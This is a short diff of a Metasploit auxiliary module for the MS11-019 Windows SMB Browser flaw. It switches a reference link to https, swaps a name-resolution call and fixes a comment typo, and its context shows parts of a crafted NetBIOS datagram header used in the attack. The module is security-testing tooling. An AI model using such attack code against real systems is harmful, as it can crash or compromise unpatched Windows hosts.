@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'OSVDB', '70881' ],
           [ 'MSB', 'MS11-019' ],
           [ 'EDB', '16166' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2011/Feb/285' ]
+          [ 'URL', 'https://seclists.org/fulldisclosure/2011/Feb/285' ]
         ],
       'Author'         => [ 'Cupidon-3005', 'jduck' ],
       'License'        => MSF_LICENSE
@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
     @client = Rex::Proto::SMB::Client.new(udp_sock)
 
     ip = Rex::Socket.source_address(datastore['RHOST'])
-    ip_src = Rex::Socket.gethostbyname(ip)[3]
+    ip_src = Rex::Socket.resolv_nbo(ip, false)
 
     svc_src = "\x41\x41\x00"   # pre-encoded?
     name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
     nbdghdr =
       "\x11" +              # DIRECT_GROUP datagram
       "\x02" +              # first and only fragment
-      [rand(0xffff)].pack('n') +  # Transation Id (DGM_ID)
+      [rand(0xffff)].pack('n') +  # Transaction Id (DGM_ID)
       ip_src +
       "\x00\x8a" +          # Source Port (138)
       "\x00\xa7" +          # DGM_LENGTH, patched in after
